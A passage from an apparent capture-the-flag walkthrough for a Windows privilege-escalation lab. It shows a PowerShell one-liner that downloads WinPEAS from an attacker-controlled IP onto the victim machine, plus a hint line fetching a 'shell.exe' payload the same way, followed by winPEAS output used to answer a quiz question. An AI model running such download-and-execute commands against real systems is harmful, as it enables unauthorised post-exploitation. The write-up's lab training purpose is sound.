powershell -c "Invoke-WebRequest -Uri 'http://10.9.0.54:8000/WinPEAS.bat' -OutFile 'c:\windows\temp\winpeas.exe'"
~~~

## #5.3

**Instructions**

Now you know how to pull files from your machine to the victims machine, we can pull winPEAS.bat to the system using the same method! ([You can find winPEAS here](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat))

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

Tip: You can execute these files by using .\filename.exe

Using winPeas, what was the Original Install time? (This is date and time)

*Hint: powershell -c "Invoke-WebRequest -Uri 'ip/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"*

**Answer**

WinPEAS is now installed on the target, let's execute it:

~~~
.\winpeas.bat
c:\Windows\Temp>.\winpeas.bat
            *((,.,/((((((((((((((((((((/,  */               
     ,/*,..*(((((((((((((((((((((((((((((((((,           
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*       
   ((((((((((((((((* *****,,,/########## .(* ,((((((   
   (((((((((((/* ******************/####### .(. ((((((
   ((((((..******************/@@@@@/***/######* /((((((
   ,,..**********************@@@@@@@@@@(***,#### ../(((((
   , ,**********************#@@@@@#@@@@*********##((/ /((((
   ..(((##########*********/#@@@@@@@@@/*************,,..((((
   .(((################(/******/@@@@@#****************.. /((
   .((########################(/************************..*(
   .((#############################(/********************.,(
   .((##################################(/***************..(
   .((######################################(************..(
   .((######(,.***.,(###################(..***(/*********..(
  .((######*(#####((##################((######/(********..(
   .((##################(/**********(################(**...(
   .(((####################/*******(###################.((((  
   .(((((############################################/  /((
   ..(((((#########################################(..(((((.
   ....(((((#####################################( .((((((.
   ......(((((#################################( .(((((((.
   (((((((((. ,(############################(../(((((((((.
       (((((((((/,  ,####################(/..((((((((((.
             (((((((((/,.  ,*//////*,. ./(((((((((((.
                (((((((((((((((((((((((((((/"
                       by carlospolop
ECHO is off.
Advisory: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
ECHO is off.
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [*] BASIC SYSTEM INFO <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-> [+] WINDOWS OS <_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
[i] Check for vulnerabilities for the OS version with the applied patches
  [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#kernel-exploits
Host Name:                 HACKPARK
OS Name:                   Microsoft Windows Server 2012 R2 Standard Evaluation
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-10000-00000-AA228
Original Install Date:     8/3/2019, 10:43:23 AM

...[SNIP]...
~~~

We see that the original install date is: `8/3/2019, 10:43:23 AM`.
